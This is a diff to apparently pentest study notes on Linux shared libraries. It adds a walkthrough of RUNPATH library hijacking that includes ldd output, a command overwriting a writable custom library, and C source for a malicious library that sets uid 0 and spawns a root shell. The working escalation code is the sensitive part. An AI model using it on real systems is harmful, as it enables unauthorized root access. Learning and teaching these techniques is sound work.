@@ -300,7 +300,9 @@ When compiled, *static libraries* become part of the program and cannot be alter
 
 The location of dynamic libraries can be specified in many ways, `-rpath` or `-rpath-link` flags at compile time, `LD_RUN_PATH` or `LD_LIBRARY_PATH` env vars, or placing the libs in `/lib` or `/usr/lib` (*default directories*), or specifying a directory in `/etc/ld.so.conf`.
 
-The `LD_PRELOAD` env var can load a library before binary execution, giving a preference over the default ones. We can view all required shared objects for a binary with `ldd [binary]`.
+The `LD_PRELOAD` env var can load a library before binary execution, giving a preference over the default ones. We can also use the `RUNPATH` configuration, giving preference over other folders.
+
+We can view all required shared objects for a binary with `ldd [binary]`. The [readelf](https://man7.org/linux/man-pages/man1/readelf.1.html) : `readelf -d [binary] | grep PATH` will show us if there is a `RUNPATH` set.
 
 We maybe able to exploit the `LD_PRELOAD` env var with `sudo` to gain privileges.
 
@@ -321,3 +323,47 @@ void _init()
 gcc -fPIC -shared -o root.so root.c -nostartfiles
 ```
 Then if we can set the `LD_PRELOAD=root.so` and we can call a binary as root (eg. through `sudo`) we might be able to escalate privileges.
+
+To hijack a custom DLL in the `RUNPATH` we need to see if it is writable:
+```bash
+ls -la [RUNPATH DIR]
+```
+If so, we can use `ldd` to find what library references point to that custom dir.
+
+Taking a copy of the existing libraries so we can restore them later, we can then copy any other library to overwrite the existing custom library. This will allow us to run the program and we might see an error that specifics which function is missing.
+
+```bash
+$ ldd payroll
+
+linux-vdso.so.1 (0x00007ffd22bbc000)
+libshared.so => /development/libshared.so (0x00007f0c13112000)
+/lib64/ld-linux-x86-64.so.2 (0x00007f0c1330a000)
+```
+
+```bash
+$ cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
+```
+
+```bash
+$ ./payroll
+
+./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery
+```
+
+We can then create a malicious library to add back the missing method (eg. `dbquery`).
+```c
+#include<stdio.h>
+#include<stdlib.h>
+#include<unistd.h>
+
+void dbquery() {
+    printf("Malicious library loaded\n");
+    setuid(0);
+    system("/bin/sh -p");
+}
+```
+```bash
+gcc src.c -fPIC -shared -o /development/libshared.so
+```
+
+This will then be run when we execute the program.
